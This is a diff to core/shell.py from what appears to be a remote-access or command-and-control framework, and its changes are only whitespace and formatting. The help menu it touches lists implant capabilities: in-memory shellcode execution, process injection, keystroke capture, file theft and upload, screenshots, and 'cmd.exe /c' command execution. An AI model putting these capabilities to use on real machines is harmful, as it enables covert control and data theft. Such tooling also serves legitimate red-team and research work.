@@ -1,10 +1,10 @@
-#!/usr/bin/python
 # -*- coding: utf-8 -*-
 
 """
     @author: Mr.Un1k0d3r RingZer0 Team
     @package: core/shell.py
 """
+
 import os
 import base64
 import subprocess
@@ -16,6 +16,7 @@ from core.alias import Alias
 from core.utils import Utils
 from core.ui import UI
 from core.log import Log
+
 
 class Shell:
 
@@ -74,7 +75,7 @@ class Shell:
 
     def help(self):
         self.output = '''Help Menu\n''' + '=' * 9 + \
-        '\n' + tabulate({'_Commands': [
+                      '\n' + tabulate({'_Commands': [
             'background',
             'fetch',
             'exec',
@@ -86,38 +87,38 @@ class Shell:
             'alias',
             'delay',
             'shell',
-	    'screenshot',
+            'screenshot',
             'help',
-            ],
+        ],
             '__Args': [
-            '',
-            'path/url, cmd',
-            'path/url',
-            'remote path',
-            'path/url, path',
-            '',
-            'pid, command',
-            'number of line (default 20)',
-            'key, value',
-            'milliseconds',
-            'command',
-            '',
-            '',
+                '',
+                'path/url, cmd',
+                'path/url',
+                'remote path',
+                'path/url, path',
+                '',
+                'pid, command',
+                'number of line (default 20)',
+                'key, value',
+                'milliseconds',
+                'command',
+                '',
+                '',
             ],
             '___Descriptions': [
-            'Return to the main console (CLI only)',
-            'In memory execution of a script and execute a command',
-            'In memory execution of code (shellcode)',
-            'Read a file on the remote host',
-            'Upload a file on the remote system',
-            'List processes',
-            'Inject command into a target process (max length 4096)',
-            'Show last n line of keystrokes captured',
-            'Create an alias to avoid typing the same thing over and over',
-            'Update the callback delay',
-            'Run command by spawning cmd.exe /c',
-            'Take a screenshot',
-            'show this help menu',
+                'Return to the main console (CLI only)',
+                'In memory execution of a script and execute a command',
+                'In memory execution of code (shellcode)',
+                'Read a file on the remote host',
+                'Upload a file on the remote system',
+                'List processes',
+                'Inject command into a target process (max length 4096)',
+                'Show last n line of keystrokes captured',
+                'Create an alias to avoid typing the same thing over and over',
+                'Update the callback delay',
+                'Run command by spawning cmd.exe /c',
+                'Take a screenshot',
+                'show this help menu',
             ]},
             headers="keys", tablefmt="simple")
 
@@ -252,9 +253,9 @@ class Shell:
         return ""
 
     def shell_exec(self):
-         command = Utils.get_arg_at(self.data, 1, 1)
-         self.output += self.output_cli_or_str("Spawning cmd.exe to execute: %s" % command)
-         return "cmd.exe /c %s" % command
+        command = Utils.get_arg_at(self.data, 1, 1)
+        self.output += self.output_cli_or_str("Spawning cmd.exe to execute: %s" % command)
+        return "cmd.exe /c %s" % command
 
     def exit(self):
-        return "exit"    
+        return "exit"
